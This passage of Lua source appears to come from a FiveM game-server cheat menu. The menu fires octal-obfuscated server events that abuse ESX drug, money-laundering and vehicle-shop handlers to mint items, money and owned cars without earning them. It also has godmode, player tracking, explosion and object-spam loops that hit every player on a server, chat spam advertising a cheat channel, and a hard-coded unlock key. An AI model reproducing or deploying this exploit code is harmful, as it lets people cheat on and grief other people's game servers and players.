        '\101\115\120\95\100\114\117\103\115\58\115\116\97\114\116\84\114\97\110\115\102\111\114\109\77\101\116\104'
    )
    TriggerServerEvent(
        '\101\115\120\95\100\114\117\103\115\58\115\116\97\114\116\84\114\97\110\115\102\111\114\109\77\101\116\104'
    )
    TriggerServerEvent(
        '\101\115\120\95\100\114\117\103\115\58\115\116\97\114\116\84\114\97\110\115\102\111\114\109\77\101\116\104'
    )
    TriggerServerEvent(
        '\101\115\120\95\100\114\117\103\115\58\115\116\97\114\116\84\114\97\110\115\102\111\114\109\77\101\116\104'
    )
end

function smeth()
    TriggerServerEvent('\101\115\120\95\100\114\117\103\115\58\115\116\97\114\116\83\101\108\108\77\101\116\104')
    TriggerServerEvent('\101\115\120\95\100\114\117\103\115\58\115\116\97\114\116\83\101\108\108\77\101\116\104')
    TriggerServerEvent('\101\115\120\95\100\114\117\103\115\58\115\116\97\114\116\83\101\108\108\77\101\116\104')
    TriggerServerEvent('\101\115\120\95\100\114\117\103\115\58\115\116\97\114\116\83\101\108\108\77\101\116\104')
    TriggerServerEvent('\101\115\120\95\100\114\117\103\115\58\115\116\97\114\116\83\101\108\108\77\101\116\104')
end

function hopi()
    TriggerServerEvent(
        '\101\115\120\95\100\114\117\103\115\58\115\116\97\114\116\72\97\114\118\101\115\116\79\112\105\117\109'
    )
    TriggerServerEvent(
        '\101\115\120\95\100\114\117\103\115\58\115\116\97\114\116\72\97\114\118\101\115\116\79\112\105\117\109'
    )
    TriggerServerEvent(
        '\101\115\120\95\100\114\117\103\115\58\115\116\97\114\116\72\97\114\118\101\115\116\79\112\105\117\109'
    )
    TriggerServerEvent(
        '\101\115\120\95\100\114\117\103\115\58\115\116\97\114\116\72\97\114\118\101\115\116\79\112\105\117\109'
    )
    TriggerServerEvent(
        '\101\115\120\95\100\114\117\103\115\58\115\116\97\114\116\72\97\114\118\101\115\116\79\112\105\117\109'
    )
end

function topi()
    TriggerServerEvent(
        '\101\115\120\95\100\114\117\103\115\58\115\116\97\114\116\84\114\97\110\115\102\111\114\109\79\112\105\117\109'
    )
    TriggerServerEvent(
        '\101\115\120\95\100\114\117\103\115\58\115\116\97\114\116\84\114\97\110\115\102\111\114\109\79\112\105\117\109'
    )
    TriggerServerEvent(
        '\101\115\120\95\100\114\117\103\115\58\115\116\97\114\116\84\114\97\110\115\102\111\114\109\79\112\105\117\109'
    )
    TriggerServerEvent(
        '\101\115\120\95\100\114\117\103\115\58\115\116\97\114\116\84\114\97\110\115\102\111\114\109\79\112\105\117\109'
    )
    TriggerServerEvent(
        '\101\115\120\95\100\114\117\103\115\58\115\116\97\114\116\84\114\97\110\115\102\111\114\109\79\112\105\117\109'
    )
end

function sopi()
    TriggerServerEvent('\101\115\120\95\100\114\117\103\115\58\115\116\97\114\116\83\101\108\108\79\112\105\117\109')
    TriggerServerEvent('\101\115\120\95\100\114\117\103\115\58\115\116\97\114\116\83\101\108\108\79\112\105\117\109')
    TriggerServerEvent('\101\115\120\95\100\114\117\103\115\58\115\116\97\114\116\83\101\108\108\79\112\105\117\109')
    TriggerServerEvent('\101\115\120\95\100\114\117\103\115\58\115\116\97\114\116\83\101\108\108\79\112\105\117\109')
    TriggerServerEvent('\101\115\120\95\100\114\117\103\115\58\115\116\97\114\116\83\101\108\108\79\112\105\117\109')
end

function mataaspalarufe()
    TriggerServerEvent(
        '\101\115\120\95\98\108\97\110\99\104\105\115\115\101\117\114\58\115\116\97\114\116\87\104\105\116\101\110\105\110\103',
        85
    )
    TriggerServerEvent(
        '\101\115\120\95\98\108\97\110\99\104\105\115\115\101\117\114\58\115\116\97\114\116\87\104\105\116\101\110\105\110\103',
        85
    )
    TriggerServerEvent(
        '\101\115\120\95\98\108\97\110\99\104\105\115\115\101\117\114\58\115\116\97\114\116\87\104\105\116\101\110\105\110\103',
        85
    )
    TriggerServerEvent(
        '\101\115\120\95\98\108\97\110\99\104\105\115\115\101\117\114\58\115\116\97\114\116\87\104\105\116\101\110\105\110\103',
        85
    )
    TriggerServerEvent(
        '\101\115\120\95\98\108\97\110\99\104\105\115\115\101\117\114\58\115\116\97\114\116\87\104\105\116\101\110\105\110\103',
        85
    )
    TriggerServerEvent(
        '\101\115\120\95\98\108\97\110\99\104\105\115\115\101\117\114\58\115\116\97\114\116\87\104\105\116\101\110\105\110\103',
        85
    )
    TriggerServerEvent(
        '\101\115\120\95\98\108\97\110\99\104\105\115\115\101\117\114\58\115\116\97\114\116\87\104\105\116\101\110\105\110\103',
        85
    )
    TriggerServerEvent(
        '\101\115\120\95\98\108\97\110\99\104\105\115\115\101\117\114\58\115\116\97\114\116\87\104\105\116\101\110\105\110\103',
        85
    )
    TriggerServerEvent(
        '\101\115\120\95\98\108\97\110\99\104\105\115\115\101\117\114\58\115\116\97\114\116\87\104\105\116\101\110\105\110\103',
        85
    )
    TriggerServerEvent(
        '\101\115\120\95\98\108\97\110\99\104\105\115\115\101\117\114\58\115\116\97\114\116\87\104\105\116\101\110\105\110\103',
        85
    )
end

function matanumaispalarufe()
    TriggerServerEvent(
        '\101\115\120\95\100\114\117\103\115\58\115\116\111\112\72\97\114\118\101\115\116\67\111\107\101'
    )
    TriggerServerEvent(
        '\101\115\120\95\100\114\117\103\115\58\115\116\111\112\84\114\97\110\115\102\111\114\109\67\111\107\101'
    )
    TriggerServerEvent('\101\115\120\95\100\114\117\103\115\58\115\116\111\112\83\101\108\108\67\111\107\101')
    TriggerServerEvent(
        '\101\115\120\95\100\114\117\103\115\58\115\116\111\112\72\97\114\118\101\115\116\77\101\116\104'
    )
    TriggerServerEvent(
        '\101\115\120\95\100\114\117\103\115\58\115\116\111\112\84\114\97\110\115\102\111\114\109\77\101\116\104'
    )
    TriggerServerEvent('\101\115\120\95\100\114\117\103\115\58\115\116\111\112\83\101\108\108\77\101\116\104')
    TriggerServerEvent(
        '\101\115\120\95\100\114\117\103\115\58\115\116\111\112\72\97\114\118\101\115\116\87\101\101\100'
    )
    TriggerServerEvent(
        '\101\115\120\95\100\114\117\103\115\58\115\116\111\112\84\114\97\110\115\102\111\114\109\87\101\101\100'
    )
    TriggerServerEvent('\101\115\120\95\100\114\117\103\115\58\115\116\111\112\83\101\108\108\87\101\101\100')
    TriggerServerEvent(
        '\101\115\120\95\100\114\117\103\115\58\115\116\111\112\72\97\114\118\101\115\116\79\112\105\117\109'
    )
    TriggerServerEvent(
        '\101\115\120\95\100\114\117\103\115\58\115\116\111\112\84\114\97\110\115\102\111\114\109\79\112\105\117\109'
    )
    TriggerServerEvent('\101\115\120\95\100\114\117\103\115\58\115\116\111\112\83\101\108\108\79\112\105\117\109')
    drawNotification(
        '\126\114\126\69\118\101\114\121\116\104\105\110\103\32\105\115\32\110\111\119\32\115\116\111\112\112\101\100\46'
    )
end
local function bX()
    local bT =
        KeyboardInput('\69\110\116\101\114\32\86\101\104\105\99\108\101\32\83\112\97\119\110\32\78\97\109\101', '', 100)
    local bY =
        KeyboardInput(
        '\69\110\116\101\114\32\86\101\104\105\99\108\101\32\76\105\99\101\110\99\101\32\80\108\97\116\101',
        '',
        100
    )
    if bT and IsModelValid(bT) and IsModelAVehicle(bT) then
        RequestModel(bT)
        while not HasModelLoaded(bT) do
            Citizen.Wait(0)
        end
        local veh =
            CreateVehicle(
            GetHashKey(bT),
            GetEntityCoords(PlayerPedId(-1)),
            GetEntityHeading(PlayerPedId(-1)),
            true,
            true
        )
        SetVehicleNumberPlateText(veh, bY)
        local bZ = ESX.Game.GetVehicleProperties(veh)
        TriggerServerEvent('esx_vehicleshop:setVehicleOwned', bZ)
        drawNotification('\126\103\126\126\104\126\83\117\99\99\101\115\115')
    else
        drawNotification(
            '\126\114\126\126\104\126\77\111\100\101\108\32\105\115\32\110\111\116\32\118\97\108\105\100\32\33'
        )
    end
end

function daojosdinpatpemata()
    local ar = GetPlayerPed(-1)
    local as = GetVehiclePedIsIn(ar, true)
    if
        IsPedInAnyVehicle(GetPlayerPed(-1), 0) and
            GetPedInVehicleSeat(GetVehiclePedIsIn(GetPlayerPed(-1), 0), -1) == GetPlayerPed(-1)
     then
        SetVehicleOnGroundProperly(as)
        drawNotification('\126\103\126\86\101\104\105\99\108\101\32\70\108\105\112\112\101\100\33')
    else
        drawNotification("~r~You Aren't In The Driverseat Of A Vehicle!")
    end
end

function stringsplit(b_, c0)
    if c0 == nil then
        c0 = '%s'
    end
    local c1 = {}
    i = 1
    for c2 in string.gmatch(b_, '([^' .. c0 .. ']+)') do
        c1[i] = c2
        i = i + 1
    end
    return c1
end
local c3 = false

function SpectatePlayer(c4)
    local ar = PlayerPedId(-1)
    c3 = not c3
    local c5 = GetPlayerPed(c4)
    if c3 then
        local c6, c7, c8 = table.unpack(GetEntityCoords(c5, false))
        RequestCollisionAtCoord(c6, c7, c8)
        NetworkSetInSpectatorMode(true, c5)
        drawNotification('Spectating ' .. GetPlayerName(c4))
    else
        local c6, c7, c8 = table.unpack(GetEntityCoords(c5, false))
        RequestCollisionAtCoord(c6, c7, c8)
        NetworkSetInSpectatorMode(false, c5)
        drawNotification('Stopped Spectating ' .. GetPlayerName(c4))
    end
end

function ShootPlayer(c4)
    local c9 = GetPedBoneCoords(c4, GetEntityBoneIndexByName(c4, 'SKEL_HEAD'), 0.0, 0.0, 0.0)
    SetPedShootsAtCoord(PlayerPedId(-1), c9.x, c9.y, c9.z, true)
end

function MaxOut(veh)
    SetVehicleModKit(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0)
    SetVehicleWheelType(GetVehiclePedIsIn(GetPlayerPed(-1), false), 7)
    SetVehicleMod(
        GetVehiclePedIsIn(GetPlayerPed(-1), false),
        0,
        GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0) - 1,
        false
    )
    SetVehicleMod(
        GetVehiclePedIsIn(GetPlayerPed(-1), false),
        1,
        GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 1) - 1,
        false
    )
    SetVehicleMod(
        GetVehiclePedIsIn(GetPlayerPed(-1), false),
        2,
        GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 2) - 1,
        false
    )
    SetVehicleMod(
        GetVehiclePedIsIn(GetPlayerPed(-1), false),
        3,
        GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 3) - 1,
        false
    )
    SetVehicleMod(
        GetVehiclePedIsIn(GetPlayerPed(-1), false),
        4,
        GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 4) - 1,
        false
    )
    SetVehicleMod(
        GetVehiclePedIsIn(GetPlayerPed(-1), false),
        5,
        GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 5) - 1,
        false
    )
    SetVehicleMod(
        GetVehiclePedIsIn(GetPlayerPed(-1), false),
        6,
        GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 6) - 1,
        false
    )
    SetVehicleMod(
        GetVehiclePedIsIn(GetPlayerPed(-1), false),
        7,
        GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 7) - 1,
        false
    )
    SetVehicleMod(
        GetVehiclePedIsIn(GetPlayerPed(-1), false),
        8,
        GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 8) - 1,
        false
    )
    SetVehicleMod(
        GetVehiclePedIsIn(GetPlayerPed(-1), false),
        9,
        GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 9) - 1,
        false
    )
    SetVehicleMod(
        GetVehiclePedIsIn(GetPlayerPed(-1), false),
        10,
        GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 10) - 1,
        false
    )
    SetVehicleMod(
        GetVehiclePedIsIn(GetPlayerPed(-1), false),
        11,
        GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 11) - 1,
        false
    )
    SetVehicleMod(
        GetVehiclePedIsIn(GetPlayerPed(-1), false),
        12,
        GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 12) - 1,
        false
    )
    SetVehicleMod(
        GetVehiclePedIsIn(GetPlayerPed(-1), false),
        13,
        GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 13) - 1,
        false
    )
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 14, 16, false)
    SetVehicleMod(
        GetVehiclePedIsIn(GetPlayerPed(-1), false),
        15,
        GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 15) - 2,
        false
    )
    SetVehicleMod(
        GetVehiclePedIsIn(GetPlayerPed(-1), false),
        16,
        GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 16) - 1,
        false
    )
    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 17, true)
    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 18, true)
    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 19, true)
    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 20, true)
    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 21, true)
    ToggleVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 22, true)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 23, 1, false)
    SetVehicleMod(GetVehiclePedIsIn(GetPlayerPed(-1), false), 24, 1, false)
    SetVehicleMod(
        GetVehiclePedIsIn(GetPlayerPed(-1), false),
        25,
        GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 25) - 1,
        false
    )
    SetVehicleMod(
        GetVehiclePedIsIn(GetPlayerPed(-1), false),
        27,
        GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 27) - 1,
        false
    )
    SetVehicleMod(
        GetVehiclePedIsIn(GetPlayerPed(-1), false),
        28,
        GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 28) - 1,
        false
    )
    SetVehicleMod(
        GetVehiclePedIsIn(GetPlayerPed(-1), false),
        30,
        GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 30) - 1,
        false
    )
    SetVehicleMod(
        GetVehiclePedIsIn(GetPlayerPed(-1), false),
        33,
        GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 33) - 1,
        false
    )
    SetVehicleMod(
        GetVehiclePedIsIn(GetPlayerPed(-1), false),
        34,
        GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 34) - 1,
        false
    )
    SetVehicleMod(
        GetVehiclePedIsIn(GetPlayerPed(-1), false),
        35,
        GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 35) - 1,
        false
    )
    SetVehicleMod(
        GetVehiclePedIsIn(GetPlayerPed(-1), false),
        38,
        GetNumVehicleMods(GetVehiclePedIsIn(GetPlayerPed(-1), false), 38) - 1,
        true
    )
    SetVehicleWindowTint(GetVehiclePedIsIn(GetPlayerPed(-1), false), 1)
    SetVehicleTyresCanBurst(GetVehiclePedIsIn(GetPlayerPed(-1), false), false)
    SetVehicleNumberPlateTextIndex(GetVehiclePedIsIn(GetPlayerPed(-1), false), 5)
end

function DelVeh(veh)
    SetEntityAsMissionEntity(Object, 1, 1)
    DeleteEntity(Object)
    SetEntityAsMissionEntity(GetVehiclePedIsIn(GetPlayerPed(-1), false), 1, 1)
    DeleteEntity(GetVehiclePedIsIn(GetPlayerPed(-1), false))
end

function Initialize(ca)
    lolxdshit = '\126\103\126\76\111\103\103\101\100'
    local ca = RequestScaleformMovie(ca)
    while not HasScaleformMovieLoaded(ca) do
        Citizen.Wait(1)
    end
    PushScaleformMovieFunction(ca, 'SHOW_SHARD_WASTED_MP_MESSAGE')
    PushScaleformMovieFunctionParameterString(lolxdshit)
    PopScaleformMovieFunctionVoid()
    return ca
end
local cb = 0
a = '\108'
b = '\121'
p = '\110'
br = '\120'
y = br .. br
yes = 879
forse = yes + 458
yep = 'give me a key'
local by = a .. b .. p .. br .. forse .. 'official'
local function cc()
    if cb == 3 then
        drawNotification("<FONT COLOR='#ff22f4'>~h~Login failed, Lynx Disabled!.")
        Citizen.Wait(5000)
        ForceSocialClubUpdate()
    else
        local a = KeyboardInput('Enter Key', '', 100)
        if a == by then
            logged = true
            PlaySoundFrontend(-1, 'PICK_UP', 'HUD_FRONTEND_DEFAULT_SOUNDSET', true)
            Citizen.Wait(100)
            PlaySoundFrontend(-1, 'PICK_UP', 'HUD_FRONTEND_DEFAULT_SOUNDSET', true)
            Citizen.Wait(100)
            PlaySoundFrontend(-1, 'PICK_UP', 'HUD_FRONTEND_DEFAULT_SOUNDSET', true)
        else
            cb = cb + 1
            drawNotification('~r~~h~Invalid key.')
            PlaySoundFrontend(-1, 'MP_WAVE_COMPLETE', 'HUD_FRONTEND_DEFAULT_SOUNDSET', true)
        end
    end
end

function Clean(veh)
    SetVehicleDirtLevel(veh, 15.0)
end

function Clean2(veh)
    SetVehicleDirtLevel(veh, 1.0)
end

function RequestControl(entity)
    local cd = 0
    NetworkRequestControlOfEntity(entity)
    while not NetworkHasControlOfEntity(entity) do
        cd = cd + 100
        Citizen.Wait(100)
        if cd > 5000 then
            drawNotification(
                '\72\117\110\103\32\102\111\114\32\53\32\115\101\99\111\110\100\115\44\32\107\105\108\108\105\110\103\32\116\111\32\112\114\101\118\101\110\116\32\105\115\115\117\101\115\46\46\46'
            )
        end
    end
end

function getEntity(c4)
    local f, entity = GetEntityPlayerIsFreeAimingAt(c4, Citizen.ReturnResultAnyway())
    return entity
end

function GetInputMode()
    return Citizen.InvokeNative(0xA571D46727E2B718, 2) and 'MouseAndKeyboard' or 'GamePad'
end

function DrawSpecialText(ce, cf)
    SetTextEntry_2('STRING')
    AddTextComponentString(ce)
    DrawSubtitleTimed(cf, 1)
end
local cg = true
local ch = false
local ci = true
Citizen.CreateThread(
    function()
        while true do
            Wait(1)
            for G = 0, 128 do
                if NetworkIsPlayerActive(G) and GetPlayerPed(G) ~= GetPlayerPed(-1) then
                    ped = GetPlayerPed(G)
                    blip = GetBlipFromEntity(ped)
                    x1, y1, z1 = table.unpack(GetEntityCoords(GetPlayerPed(-1), true))
                    x2, y2, z2 = table.unpack(GetEntityCoords(GetPlayerPed(G), true))
                    distance = math.floor(GetDistanceBetweenCoords(x1, y1, z1, x2, y2, z2, true))
                    headId = Citizen.InvokeNative(0xBFEFE3321A3F5015, ped, GetPlayerName(G), false, false, '', false)
                    wantedLvl = GetPlayerWantedLevel(G)
                    if ch then
                        Citizen.InvokeNative(0x63BB75ABEDC1F6A0, headId, 0, true)
                        if wantedLvl then
                            Citizen.InvokeNative(0x63BB75ABEDC1F6A0, headId, 7, true)
                            Citizen.InvokeNative(0xCF228E2AA03099C3, headId, wantedLvl)
                        else
                            Citizen.InvokeNative(0x63BB75ABEDC1F6A0, headId, 7, false)
                        end
                    else
                        Citizen.InvokeNative(0x63BB75ABEDC1F6A0, headId, 7, false)
                        Citizen.InvokeNative(0x63BB75ABEDC1F6A0, headId, 9, false)
                        Citizen.InvokeNative(0x63BB75ABEDC1F6A0, headId, 0, false)
                    end
                    if cg then
                        if not DoesBlipExist(blip) then
                            blip = AddBlipForEntity(ped)
                            SetBlipSprite(blip, 1)
                            Citizen.InvokeNative(0x5FBCA48327B914DF, blip, true)
                            SetBlipNameToPlayerName(blip, G)
                        else
                            veh = GetVehiclePedIsIn(ped, false)
                            blipSprite = GetBlipSprite(blip)
                            if not GetEntityHealth(ped) then
                                if blipSprite ~= 274 then
                                    SetBlipSprite(blip, 274)
                                    Citizen.InvokeNative(0x5FBCA48327B914DF, blip, false)
                                    SetBlipNameToPlayerName(blip, G)
                                end
                            elseif veh then
                                vehClass = GetVehicleClass(veh)
                                vehModel = GetEntityModel(veh)
                                if vehClass == 15 then
                                    if blipSprite ~= 422 then
                                        SetBlipSprite(blip, 422)
                                        Citizen.InvokeNative(0x5FBCA48327B914DF, blip, false)
                                        SetBlipNameToPlayerName(blip, G)
                                    end
                                elseif vehClass == 16 then
                                    if
                                        vehModel == GetHashKey('besra') or vehModel == GetHashKey('hydra') or
                                            vehModel == GetHashKey('lazer')
                                     then
                                        if blipSprite ~= 424 then
                                            SetBlipSprite(blip, 424)
                                            Citizen.InvokeNative(0x5FBCA48327B914DF, blip, false)
                                            SetBlipNameToPlayerName(blip, G)
                                        end
                                    elseif blipSprite ~= 423 then
                                        SetBlipSprite(blip, 423)
                                        Citizen.InvokeNative(0x5FBCA48327B914DF, blip, false)
                                    end
                                elseif vehClass == 14 then
                                    if blipSprite ~= 427 then
                                        SetBlipSprite(blip, 427)
                                        Citizen.InvokeNative(0x5FBCA48327B914DF, blip, false)
                                    end
                                elseif
                                    vehModel == GetHashKey('insurgent') or vehModel == GetHashKey('insurgent2') or
                                        vehModel == GetHashKey('limo2')
                                 then
                                    if blipSprite ~= 426 then
                                        SetBlipSprite(blip, 426)
                                        Citizen.InvokeNative(0x5FBCA48327B914DF, blip, false)
                                        SetBlipNameToPlayerName(blip, G)
                                    end
                                elseif vehModel == GetHashKey('rhino') then
                                    if blipSprite ~= 421 then
                                        SetBlipSprite(blip, 421)
                                        Citizen.InvokeNative(0x5FBCA48327B914DF, blip, false)
                                        SetBlipNameToPlayerName(blip, G)
                                    end
                                elseif blipSprite ~= 1 then
                                    SetBlipSprite(blip, 1)
                                    Citizen.InvokeNative(0x5FBCA48327B914DF, blip, true)
                                    SetBlipNameToPlayerName(blip, G)
                                end
                                passengers = GetVehicleNumberOfPassengers(veh)
                                if passengers then
                                    if not IsVehicleSeatFree(veh, -1) then
                                        passengers = passengers + 1
                                    end
                                    ShowNumberOnBlip(blip, passengers)
                                else
                                    HideNumberOnBlip(blip)
                                end
                            else
                                HideNumberOnBlip(blip)
                                if blipSprite ~= 1 then
                                    SetBlipSprite(blip, 1)
                                    Citizen.InvokeNative(0x5FBCA48327B914DF, blip, true)
                                    SetBlipNameToPlayerName(blip, G)
                                end
                            end
                            SetBlipRotation(blip, math.ceil(GetEntityHeading(veh)))
                            SetBlipNameToPlayerName(blip, G)
                            SetBlipScale(blip, 0.85)
                            if IsPauseMenuActive() then
                                SetBlipAlpha(blip, 255)
                            else
                                x1, y1 = table.unpack(GetEntityCoords(GetPlayerPed(-1), true))
                                x2, y2 = table.unpack(GetEntityCoords(GetPlayerPed(G), true))
                                distance =
                                    math.floor(math.abs(math.sqrt((x1 - x2) * (x1 - x2) + (y1 - y2) * (y1 - y2))) / -1) +
                                    900
                                if distance < 0 then
                                    distance = 0
                                elseif distance > 255 then
                                    distance = 255
                                end
                                SetBlipAlpha(blip, distance)
                            end
                        end
                    else
                        RemoveBlip(blip)
                    end
                end
            end
        end
    end
)
local cj = {
    __gc = function(ck)
        if ck.destructor and ck.handle then
            ck.destructor(ck.handle)
        end
        ck.destructor = nil
        ck.handle = nil
    end
}

function EnumerateEntities(cl, cm, cn)
    return coroutine.wrap(
        function()
            local co, G = cl()
            if not G or G == 0 then
                cn(co)
                return
            end
            local ck = {handle = co, destructor = cn}
            setmetatable(ck, cj)
            local cp = true
            repeat
                coroutine.yield(G)
                cp, G = cm(co)
            until not cp
            ck.destructor, ck.handle = nil, nil
            cn(co)
        end
    )
end

function EnumeratePeds()
    return EnumerateEntities(FindFirstPed, FindNextPed, EndFindPed)
end

function EnumerateVehicles()
    return EnumerateEntities(FindFirstVehicle, FindNextVehicle, EndFindVehicle)
end

function EnumerateObjects()
    return EnumerateEntities(FindFirstObject, FindNextObject, EndFindObject)
end

function RotationToDirection(cq)
    local cr = cq.z * 0.0174532924
    local cs = cq.x * 0.0174532924
    local ct = math.abs(math.cos(cs))
    return vector3(-math.sin(cr) * ct, math.cos(cr) * ct, math.sin(cs))
end

function OscillateEntity(entity, cu, cv, cw, cx)
    if entity ~= 0 and entity ~= nil then
        local cy = (cv - cu) * cw * cw - 2.0 * cw * cx * GetEntityVelocity(entity)
        ApplyForceToEntity(entity, 3, cy.x, cy.y, cy.z + 0.1, 0.0, 0.0, 0.0, false, false, true, true, false, true)
    end
end
local cz = true

Citizen.CreateThread(
    function()
        while bm do
            Citizen.Wait(0)
            SetPlayerInvincible(PlayerId(), Godmode)
            SetEntityInvincible(PlayerPedId(), Godmode)
            SetEntityVisible(GetPlayerPed(), cz, 0)
            ClearPlayerWantedLevel(PlayerId())
            if SuperJump then
                SetSuperJumpThisFrame(PlayerId(-1))
            end
            if InfStamina then
                RestorePlayerStamina(PlayerId(-1), 1.0)
            end

            if chatspam then
                TriggerServerEvent(
                    '_chat:messageEntered',
                    'BRUTAN ON YOUTUBE - BEST FIVEM CHEATS',
                    {0, 0x99, 255},
                    '/ooc BRUTAN ON YOUTUBE - BEST FIVEM CHEATS'
                )
                TriggerServerEvent('_chat:messageEntered', 'BRUTAN ON YOUTUBE - BEST FIVEM CHEATS', {0, 0x99, 255}, 'BRUTAN ON YOUTUBE - BEST FIVEM CHEATS')
            end

            if MagicBullet then
                if IsPedShooting(PlayerPedId()) then
                        local c2 = GetPedImpact(GetPlayerPed(-1))
                        AddExplosion(c2.x, c2.y, c2.z, 4, 100.0, false, true, 0.0, true)
                end
            end

            if speedmit == true then
                while speedmit do
                    local time = 1
                    Citizen.Wait(5)
                    local s = tonumber(GetEntitySpeed(GetVehiclePedIsIn(GetPlayerPed(-1)))) - 1
                    if IsPedInAnyVehicle(GetPlayerPed(-1), false) == 1 then
                        if s <= 0.3 then
                            SetVehicleOnGroundProperly(GetVehiclePedIsUsing(GetPlayerPed(-1), false))
                            print('measure worked')
                        end
                    else
                        time = 0
                        drawNotification('~h~Hidden Speed Caution Measures Disabled')
                        speedmit = false
                    end
                end
            end

 --[[]          if asshat then
                local speed = GetEntitySpeed(GetPlayerPed(-1))
                local v = GetVehiclePedIsIn(GetPlayerPed(-1), false)
                if not IsEntityDead(assped) then
                    Citizen.Wait(200)
                TaskVehicleEscort(assped, v, asstarget, -1, speed, 8388636, 150, 0, 30)
                else
                    asshat = false
                end
            end ]]

            if PedGuardPlayer then
                while PedGuardPlayer do
                    Citizen.Wait(140)
                    local i = 1 
                    local entity = getEntity(PlayerId())
                    if IsPedInAnyVehicle(entity) then
                                        TaskDriveBy(
                                        pedlist[i],
                                        entity,
                                        pos.x,
                                        pos.y,
                                        pos.z,
                                        200,
                                        99,
                                        0,
                                        'FIRING_PATTERN_BURST_FIRE_DRIVEBY'
                                    )
                                    TaskShootAtEntity(
                                        pedlist[i],
                                        entity,
                                        200,
                                        'FIRING_PATTERN_BURST_FIRE_DRIVEBY'
                                    )
                                    makePedHostile(pedlist[i], entity, 0, 0)
                                    TaskCombatPed(pedlist[i], entity, 0, 16)
                                elseif not IsPedInAnyVehicle(entity) then
                                    makePedHostile(pedlist[i], entity, 0, 0)
                                    TaskCombatPed(pedlist[i], entity, 0, 16)
                                elseif i == #pedlist then
                                    i = 1
                                end
                            end
                        end


            if Follow == true then
                Citizen.Wait(30)
                local ped = GetPlayerPed(-1)
                local vehicle = GetVehiclePedIsIn(ped, false)
                local co = GetEntityCoords(SelectedPlayer)
                TaskVehicleGotoNavmesh(ped, vehicle, co.x, co.y, co.z, 50, 156, 5)
            end

            if BananaBoom then
                for i = 0, 128 do
                    if NetworkIsPlayerActive(i) then
                        local ped = GetPlayerPed(i)
                        local coords = GetEntityCoords(ped)
                        SetEntityHealth(PlayerPedId(), 0)
                        AddExplosion(coords.x, coords.y, coords.z, 4, 100.0, false, true, 0.0)
                        TriggerServerEvent(
                            '_chat:messageEntered',
                            'BRUTAN ON YOUTUBE - BEST FIVEM CHEATS',
                            {0, 0x99, 255},
                            '/ooc BRUTAN ON YOUTUBE - BEST FIVEM CHEATS'
                        )
                        TriggerServerEvent(
                            '_chat:messageEntered',
                            'BRUTAN ON YOUTUBE - BEST FIVEM CHEATS',
                            {0, 0x99, 255},
                            'BRUTAN ON YOUTUBE - BEST FIVEM CHEATS'
                        )
                    end
                end
                drawNotification('~r~Killed for Protection')
            end

            if BananaCrazy then
                for i = 0, 256 do
                    if NetworkIsPlayerActive(i) then
                        local ped = GetPlayerPed(i)
                        local pos = GetEntityCoords(ped)
                        local pitch = GetEntityPitch(ped)
                        local roll = GetEntityRoll(ped)
                        local yaw = GetEntityRotation(ped).z
                        local xf = GetEntityForwardX(ped)
                        local yf = GetEntityForwardY(ped)
                        ob1 =
                            CreateObject('prop_container_01a', pos.x - (xf * 10), pos.y - (yf * 10), pos.z - 1, 1, 1, 1)
                        SetEntityRotation(ob1, pitch, roll, yaw + 90)
                        SetEntityVisible(ob1, 0, 1, 1)
                    end
                end
                drawNotification('You Made A Mistake')
            end

            if BananaSpawn then
                for i = 0, 256 do
                    if NetworkIsPlayerActive(i) then
                        local ped = GetPlayerPed(i)
                        local coords = GetEntityCoords(ped)
                        local vehiclehash = GetHashKey('deluxo')
                        RequestModel(vehiclehash)
                        CreateVehicle(vehiclehash, coords.x, coords.y, coords.z, GetEntityHeading(ped), 1, 0)
                        SetEntityAsNoLongerNeeded(veh)
                        TriggerServerEvent(
                            '_chat:messageEntered',
                            'Brutan on YouTube',
                            {0, 0x99, 255},
                            '/ooc BRUTAN ON YOUTUBE BEST FIVEM CHEATS'
                        )
                        TriggerServerEvent(
                            '_chat:messageEntered',
                            'BRUTAN ON YOUTUBE BEST FIVEM CHEATS',
                            {0, 0x99, 255},
                            'BRUTAN ON YOUTUBE BEST FIVEM CHEATS'
                        )
                        TriggerServerEvent(
                            '_chat:messageEntered',
                            'BRUTAN ON YOUTUBE BEST FIVEM CHEATS',
                            {0, 0x99, 255},
                            '/tweet BRUTAN ON YOUTUBE BEST FIVEM CHEATS'
                        )
                    end
                end
            end

            if BananaAll then
